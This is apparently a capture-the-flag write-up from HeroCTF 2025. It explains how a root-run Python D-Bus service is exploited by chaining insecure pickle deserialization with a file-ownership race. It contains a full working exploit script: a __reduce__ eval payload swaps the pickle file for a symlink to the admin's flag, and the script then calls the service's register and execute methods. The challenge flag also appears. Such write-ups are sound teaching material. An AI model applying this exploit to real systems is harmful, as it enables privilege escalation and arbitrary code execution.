system
## 1. Reconnaissance

Starting as the user `dev` (obtained in the previous challenge), we investigated running processes and found a Python service running as **root**:

Bash

```
root  19 ... /usr/bin/python3 /opt/procservice/procedure-processing-service.py
```

We located the source code in `~/procservice_src/`. Analyzing `procedure-processing-service.py` and `lib/utils.py` revealed it was a **D-Bus Service** that allows users to "Register" and "Execute" Python code (via Pickle serialization).

## 2. Vulnerability Analysis

The application had two distinct vulnerabilities that, when chained, allowed for Privilege Escalation.

### A. Insecure Deserialization

The service used `pickle` to handle user input. The `ExecuteProcedure` method called `unpickle_file()`:

Python

```
# From procedure-processing-service.py
obj_repr, error = unpickle_file(filepath) # <--- Vulnerability 1
# ...
file_stat = os.stat(filepath)             # <--- Owner Check
file_owner_uid = file_stat.st_uid
# ...
result = execute_as_user(obj_repr, file_owner_uid)
```

In Python, `unpickle_file()` executes code immediately (via `__reduce__`) _before_ the service checks who owns the file or what the code does.

### B. TOCTOU (Time-of-Check to Time-of-Use)

The service attempted to enforce security by checking the file owner (`os.stat`) and then executing the code _as that user_ (`execute_as_user`).

However, there is a gap between **Unpickling** (Step 1) and **Checking Ownership** (Step 2).

- **Step 1:** The service unpickles our file. We can run code here as `dbus-service`.
    
- **Step 2:** The service checks `os.stat(filepath)`.
    
- **Step 3:** The service executes the return string as the file owner.
    

**The Exploit Path:** We can use the code execution in Step 1 to **delete our own pickle file** and replace it with a **symlink to the flag**. When Step 2 happens, the service will follow the symlink, see that the flag is owned by **Admin**, and then execute our payload with Admin privileges.

## 3. The Exploit Strategy

We crafted a Python script to interact with the D-Bus.

1. **The Payload:** A Python `__reduce__` method that:
    
    - Iterates through files in `/var/procedures`.
        
    - Finds the pickle file currently being processed.
        
    - **Deletes it.**
        
    - **Symlinks it** to `/home/admin/flag.txt`.
        
    - Returns a string: `'print(open("/home/admin/flag.txt").read())'`.
        
2. **The Trigger:**
    
    - Register the procedure (creates the file as `dev`).
        
    - Execute the procedure (triggers the unpickle -> swap -> execute as admin).
        

## 4. The Exploit Code

Due to Python syntax restrictions inside `eval()`, we used a tuple expression and `__import__` to keep the payload clean.

Python

```
import dbus
import pickle
import base64

# CONFIG
PROC_NAME = "pwn_admin"
TARGET_FLAG = "/home/admin/flag.txt"
GLOB_PATTERN = f"/var/procedures/*_{PROC_NAME}.pkl"

class SwapAttack(object):
    def __reduce__(self):
        # The Trap: Runs as dbus-service immediately upon unpickling
        # 1. Finds the pickle file.
        # 2. Deletes it.
        # 3. Symlinks it to the target Admin file.
        # 4. Returns the payload string to be executed as Admin.
        
        expr = f"""
(
    [
        (
            __import__('os').remove(p),
            __import__('os').symlink('{TARGET_FLAG}', p)
        ) 
        for p in __import__('glob').glob('{GLOB_PATTERN}')
    ],
    'print(open("{TARGET_FLAG}").read())'
)[1]
"""
        return (eval, (expr,))

# 1. Generate Payload
payload_obj = SwapAttack()
serialized = pickle.dumps(payload_obj)
payload_b64 = base64.b64encode(serialized).decode('utf-8')

# 2. Connect to DBus
bus = dbus.SystemBus()
proxy = bus.get_object('com.system.ProcedureService', '/com/system/ProcedureService')
interface = dbus.Interface(proxy, 'com.system.ProcedureService')

# 3. Register & Trigger
try:
    interface.RegisterProcedure(PROC_NAME, payload_b64)
except Exception:
    pass

try:
    print(interface.ExecuteProcedure(PROC_NAME))
except Exception as e:
    print(e)
```

## 5. Result

Running the exploit successfully bypassed the `systemd` sandboxing (which prevented writing to `/tmp` or `/home`) by tricking the service into reading the flag itself and returning the content via the D-Bus response.

Bash

```
python3 exploit_toctou.py
```

**Flag:** `Hero{d0ubl3_rc3_ftw_ad57172613c7d5403a671fd7878a659d}`

[[HeroCTF 2025]]
